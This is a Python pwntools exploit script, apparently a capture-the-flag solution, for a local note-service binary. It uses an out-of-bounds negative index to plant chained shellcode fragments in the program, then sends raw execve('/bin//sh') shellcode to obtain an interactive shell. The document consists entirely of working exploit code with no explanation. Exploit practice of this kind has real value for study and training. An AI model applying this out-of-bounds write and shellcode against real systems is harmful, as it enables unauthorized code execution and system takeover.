from pwn import *

EXEC = './task_note_service2'
context(log_level = 'debug', arch='amd64', os='linux')
e = ELF(EXEC)
local = 1
if local:
    io = process(EXEC)

def debug(cmd=""):
    attach(io, cmd)

def cmd(cmd):
    io.sendlineafter("your choice>> ", str(cmd))

def add(idx, size, content):
    cmd(1)
    io.sendlineafter("index", str(idx))
    io.sendlineafter("size", str(size))
    io.sendlineafter("content", content)

def delete(idx):
    cmd(4)
    io.sendlineafter("index", str(idx))

def exit():
    cmd(5)

sc_pay = """
pop rax
pop rax
pop rax
pop rax
xor rdx, rdx
"""

shellcode = asm(sc_pay)
add(-17, 8, shellcode)
sc_pay = """
push rax
push rax
push rdi
pop rsi
xor rdi, rdi
"""

shellcode = asm(sc_pay)
add(1, 8, shellcode)

sc_pay = """
push rax
push rax
xor rax, rax
syscall
"""

shellcode = asm(sc_pay)
add(2, 8, shellcode)
gdb.attach(io)
delete(0)

payload = "a"*(0x47)

payload = "\xeb\x10\x48\x31\xc0\x5f\x48\x31\xd2\x48\x83" \
        + "\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69" \
        + "\x6e\x2f\x2f\x73\x68"

io.send(payload)
io.interactive()
